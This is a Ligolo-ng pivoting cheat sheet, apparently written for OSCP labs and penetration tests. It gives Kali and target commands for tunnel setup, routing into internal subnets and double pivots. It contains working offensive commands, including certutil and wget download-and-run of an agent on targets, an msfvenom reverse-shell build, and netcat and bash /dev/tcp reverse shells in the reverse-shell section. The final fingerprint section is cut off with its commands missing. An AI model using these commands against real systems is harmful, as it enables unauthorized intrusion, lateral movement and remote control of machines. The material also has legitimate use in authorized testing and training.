01 — Initial Setup (Kali)

01 🔌 Create TUN Interface KALI
Create & bring up
sudo ip tuntap add user root mode tun ligolo sudo ip link set ligolo up # Verify it exists ip link show ligolo
⚠️ Requires sudo. Only needs to be done once per session. Won't persist across reboots.
For double pivot — create tunnel2
sudo ip tuntap add user root mode tun tunnel2 sudo ip link set tunnel2 up
02 🖥️ Start Proxy Server KALI
Self-signed cert (labs / OSCP)
sudo ./proxy -selfcert # Listens on 0.0.0.0:11601 by default
Custom port
sudo ./proxy -selfcert -laddr 0.0.0.0:443
Trusted cert (real engagements)
sudo ./proxy -certfile ligolo-ng.crt \ -keyfile ligolo-ng.key
If installed via apt (Kali 2024.2+)
sudo apt install ligolo-ng ligolo-proxy -selfcert
03 📤 Transfer & Run Agent TARGET
Serve from Kali
python3 -m http.server 80
Download on Linux target
wget http://192.168.45.176/agent chmod +x agent ./agent -connect 192.168.45.176:11601 -ignore-cert
Download on Windows target
certutil -urlcache -split -f http://192.168.45.176/agent.exe agent.exe # Or: powershell wget http://192.168.45.176/agent.exe -o agent.exe .\agent.exe -connect 192.168.45.176:11601 -ignore-cert
✅ Agent does NOT require admin/root privileges on the target.

02 — Session & Tunnel (Proxy Console)

04 🎛️ Session Management PROXY CONSOLE
Select a session
ligolo-ng » session # Use arrow keys to choose, then Enter
Enumerate agent's interfaces
[Agent: user@target] » ifconfig # Note internal subnets not reachable from Kali
Start tunnel on default interface
[Agent: user@target] » start
Start tunnel on named interface
[Agent: user@target] » start --tun tunnel2
Stop tunnel
[Agent: user@target] » stop
05 🗺️ Add Routes (Kali Terminal) KALI
Route internal subnet via ligolo
sudo ip route add 10.10.10.0/24 dev ligolo
Route second internal subnet via tunnel2
sudo ip route add 11.11.11.0/24 dev tunnel2
Access agent's localhost (jumpbox ports)
sudo ip route add 240.0.0.1/32 dev ligolo # 240.0.0.1 = magic IP for agent's 127.0.0.1 nmap -p- 240.0.0.1
Verify routes
ip route | grep ligolo
💡 Run route commands in a new terminal — leave the proxy console open.
06 ✅ Verify Tunnel KALI
Ping internal host
ping 10.10.10.1
SMB sweep
netexec smb 10.10.10.0/24 # Or: crackmapexec smb 10.10.10.0/24
Nmap scan (unprivileged for ICMP)
nmap --unprivileged -sT -Pn 10.10.10.10 # No proxychains needed!
Quick host discovery
nmap -v -n --unprivileged -T4 10.10.10.0/24
⚠️ Use --unprivileged or -sT with nmap — raw SYN scans don't work through the tunnel.

03 — Double Pivot Flow

🖥️ KALI 192.168.45.176 (tun0) proxy -selfcert
◀──▶
🎯 TARGET #1 ext: 192.168.1.13 int: 10.10.10.10
──▶
🌐 10.10.10.0/24 Route via ligolo listener on :11601
◀──▶
🎯 TARGET #2 ext: 10.10.10.13 int: 11.11.11.11
──▶
🌐 11.11.11.0/24 Route via tunnel2
07 🔗 First Pivot — Listener for 2nd Agent PROXY CONSOLE
On session of TARGET #1 — allow 2nd agent to connect back
# Add listener so 2nd target can reach Kali's proxy [Agent: user@target1] » listener_add \ --addr 0.0.0.0:11601 \ --to 127.0.0.1:11601 --tcp # Verify it's active [Agent: user@target1] » listener_list
Run agent on TARGET #2 — connect through TARGET #1
.\agent.exe -connect 10.10.10.10:11601 -ignore-cert # 10.10.10.10 = TARGET #1 internal IP (not Kali!)
Back in proxy — select new session & start tunnel2
ligolo-ng » session # select target #2 session [Agent: user@target2] » start --tun tunnel2
Add route for 2nd internal network
# In a new Kali terminal: sudo ip route add 11.11.11.0/24 dev tunnel2
08 ↕️ Port Forwarding via Listeners PROXY CONSOLE
Syntax — forward target port → Kali port
[Agent] » listener_add \ --addr 0.0.0.0:<AGENT_PORT> \ --to 127.0.0.1:<KALI_PORT> --tcp # Traffic on AGENT_PORT → forwarded to KALI_PORT
Common listeners for whitelisted ports
# HTTP server listener [Agent] » listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp # HTTPS/reverse shell listener [Agent] » listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
File transfer from internal host
# On TARGET #2 — download from Kali via TARGET #1's IP wget http://10.10.10.10/tool.exe -outfile tool.exe # Or PowerShell: Invoke-WebRequest -Uri http://10.10.10.10:80/tool.exe -OutFile tool.exe
Manage listeners
[Agent] » listener_list # show active [Agent] » listener_stop 0 # stop by ID

04 — Reverse Shells via Ligolo

09 🐚 Catch Reverse Shell from Internal BOTH
Step 1 — Add listener in proxy (forward agent port → Kali nc)
[Agent: user@target1] » listener_add \ --addr 0.0.0.0:8888 \ --to 127.0.0.1:443 --tcp # port 8888 on target → port 443 on Kali
Step 2 — Start netcat on Kali
nc -lvnp 443
Step 3 — Generate payload pointing to AGENT's IP (not Kali!)
msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=10.10.10.10 LPORT=8888 \ -f exe -o rev.exe # LHOST = internal IP of agent (TARGET #1) # LPORT = listener port on agent (:8888)
Step 4 — Execute on TARGET #2
.\rev.exe # Shell arrives on Kali nc :443 via Ligolo forward
Simple netcat reverse shell alternative
nc64.exe 10.10.10.10 443 -e cmd # Or using bash on Linux: bash -i >& /dev/tcp/10.10.10.10/443 0>&1
10 🏠 Access Jumpbox Local Ports KALI
💡 Found a web app / service running only on the agent's loopback (127.0.0.1)? Use 240.0.0.1 — Ligolo's magic IP for agent localhost.
Add the magic route
sudo ip route add 240.0.0.1/32 dev ligolo
Scan all local ports on the agent
nmap -p- 240.0.0.1 # Shows ports open on agent's 127.0.0.1 # No proxychains needed — works with Firefox too!
Browse a local web app on the agent
# In Firefox / curl — point to: curl http://240.0.0.1:8080 # Or open in Firefox: http://240.0.0.1:8080
SSH directly into agent's local service
ssh user@240.0.0.1 -p 22
✅ Works in any tool — nmap, curl, ssh, Firefox, impacket — without any proxy configuration.

15 🔐 Fingerprint Auth (More Secure) BOTH
Get cert fingerprint from proxy console

Agent — connect using fingerprint (no -ignore-cert)

✅ Safer than -ignore-cert — prevents MitM attacks in real engagements.
